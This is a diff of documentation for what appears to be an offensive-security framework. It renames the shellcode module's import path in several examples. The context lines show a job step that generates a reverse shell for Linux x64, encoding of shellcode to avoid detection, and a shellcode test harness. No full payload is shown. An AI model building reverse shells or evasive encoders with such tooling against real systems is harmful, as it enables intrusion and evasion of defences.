@@ -127,7 +127,7 @@ jobs:
     steps:
       - name: Generate reverse shell
         script: |
-          from ofx.api.shellcode import ShellGenerator
+          from ofx.api.exploitation.shellcode import ShellGenerator
           
           gen = ShellGenerator('linux', 'x64')
           shellcode, length = gen.get_shellcode(
@@ -174,7 +174,7 @@ Most connectors support various encoding methods to avoid detection:
 
 Example:
 ```python
-from ofx.api.shellcode.encoder import encode_xor, encode_alpha
+from ofx.api.exploitation.shellcode.encoder import encode_xor, encode_alpha
 
 # XOR encoding
 encoded = encode_xor(shellcode, key=0xAA)
@@ -243,7 +243,7 @@ docker run --rm -v $(pwd):/work shellcode-builder
 Always test in a safe, isolated environment:
 
 ```python
-from ofx.api.shellcode import test_shellcode
+from ofx.api.exploitation.shellcode import test_shellcode
 
 # Test if shellcode executes without crashing
 result = test_shellcode(
